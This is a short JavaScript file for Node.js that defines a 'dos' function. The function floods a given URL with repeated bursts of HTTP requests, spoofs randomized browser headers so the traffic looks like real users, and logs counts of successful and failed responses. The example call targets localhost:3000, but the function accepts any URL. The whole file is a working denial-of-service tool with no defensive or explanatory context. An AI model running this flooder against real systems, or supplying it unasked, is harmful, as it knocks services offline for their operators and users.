const req = require('request')
const HeaderGenerator  = require('header-generator');

const headersGenerator = new HeaderGenerator({
    browsers: [
        {name: "firefox", minVersion: 80},
        {name: "chrome", minVersion: 87},
        "safari"
    ],
    devices: [
        "desktop",
        "mobile"
    ],
    operatingSystems: [
        "linux",
        "windows"
    ]
});

const dos = (url, qty, ms) => {
    let ok = 0;
    let err = 0


    setInterval(() => {
        for (let i = qty; i--;) {
            req(url, {
                headers: headersGenerator.getHeaders({
                    operatingSystems: [
                        "linux",
                    ],
                    locales: ["en-US", "en", "ru"]
                }),
            }, error => !error ? ok++ : err++)
        }

        console.log(`Results: 
        Ok responses: ${ ok };
        Error responses ${ err }`);

        err = ok = 0

    }, ms);
}


dos('http://localhost:3000', 500, 100);
